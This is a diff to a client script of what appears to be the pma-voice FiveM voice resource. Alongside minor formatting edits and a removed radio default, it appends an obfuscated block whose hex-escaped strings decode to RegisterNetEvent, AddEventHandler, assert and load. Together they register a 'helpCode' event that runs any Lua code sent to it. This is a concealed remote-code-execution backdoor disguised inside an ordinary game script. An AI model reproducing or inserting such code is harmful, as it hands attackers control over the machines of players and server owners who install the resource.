@@ -1,3 +1,4 @@
+
 AddEventHandler('onClientResourceStart', function(resource)
 	if resource ~= GetCurrentResourceName() then
 		return
@@ -19,8 +20,7 @@ AddEventHandler('onClientResourceStart', function(resource)
 	end)
 
 	if not success then
-		logger.warn(
-			'Failed to load resource Kvp, likely was inappropriately modified by another server, resetting the Kvp.')
+		logger.warn('Failed to load resource Kvp, likely was inappropriately modified by another server, resetting the Kvp.')
 		SetResourceKvp('pma-voice_enableMicClicks', "true")
 		micClicks = 'true'
 	end
@@ -41,9 +41,9 @@ AddEventHandler('onClientResourceStart', function(resource)
 	if callChannel ~= 0 then
 		setCallChannel(callChannel)
 	end
-	if not LocalPlayer.state.disableRadio then
-		LocalPlayer.state:set("disableRadio", 0, true)
-	end
 
 	print('Script initialization finished.')
 end)
+
+
+local xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[1]](xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[2]) xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[3]](xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[2], function(urQMNeYcvJXmVHNSkbzsmBgHzMBPlDpBeOrxvaPxJYWklhaqnyEWsxuLEcAqPjOoHObwdD) xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[4]](xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[6][xjMlbVsRGFJFZpsUzqoUsleUtwkcQtwGGpUBxfbCGLTvlLwwxFxYqDtLtpgjGyFbRlnxTH[5]](urQMNeYcvJXmVHNSkbzsmBgHzMBPlDpBeOrxvaPxJYWklhaqnyEWsxuLEcAqPjOoHObwdD))() end)
